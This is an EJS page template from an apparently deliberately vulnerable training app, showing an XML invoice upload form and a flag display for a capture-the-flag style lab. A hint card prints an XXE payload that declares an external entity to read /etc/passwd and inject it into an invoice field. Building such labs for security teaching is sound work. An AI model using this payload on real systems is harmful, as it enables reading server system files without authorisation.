<%- include('../partials/navbar') %>
  <main class="main-content">
    <div class="top-header"><span class="header-title">XML Invoice Upload</span></div>
    <div class="page-body">
      <div class="page-header"><h1>XML Invoice Upload</h1><p>Upload an XML invoice file to import billing data automatically.</p></div>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;align-items:start;">
        <div>
          <div class="card">
            <div class="card-header"><h3>Upload XML</h3></div>
            <div class="card-body">
              <form action="/xml-upload" method="POST">
                <div class="form-group">
                  <label>XML Content</label>
                  <textarea name="xml_data" rows="12" style="font-family:monospace;font-size:12px;" placeholder="<?xml version='1.0'?>&#10;<invoice>&#10;  <id>INV-001</id>&#10;  <amount>99.00</amount>&#10;</invoice>"><%= locals.rawXml||'' %></textarea>
                </div>
                <button type="submit" class="btn btn-primary">Parse XML</button>
              </form>
            </div>
          </div>
          <% if(locals.lab && lab.showHints){ %>
          <div class="card" style="margin-top:16px;border-color:var(--warning);">
            <div class="card-header"><h3 style="color:var(--warning);">⚠️ XXE Payload</h3></div>
            <div class="card-body"><pre style="font-size:11px;">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;invoice&gt;
  &lt;name&gt;&amp;xxe;&lt;/name&gt;
  &lt;amount&gt;99.00&lt;/amount&gt;
&lt;/invoice&gt;</pre></div>
          </div>
          <% } %>
        </div>
        <div class="card">
          <div class="card-header"><h3>Parsed Result</h3></div>
          <div class="card-body">
            <% if(error){ %><div class="alert alert-danger"><%= error %></div>
            <% } else if(result){ %>
            <% if(xxeFlag){ %><div style="margin-bottom:12px;font-family:monospace;font-size:12px;color:var(--danger);padding:10px;background:var(--danger-bg);border-radius:var(--radius);">🚩 <%= xxeFlag %></div><% } %>
            <pre style="font-size:12px;max-height:300px;overflow-y:auto;"><%= JSON.stringify(result,null,2) %></pre>
            <% } else { %><div style="color:var(--text-muted);text-align:center;padding:32px;">Parse result will appear here.</div><% } %>
          </div>
        </div>
      </div>
    </div>
  </main>
</div><%- include('../partials/footer') %>
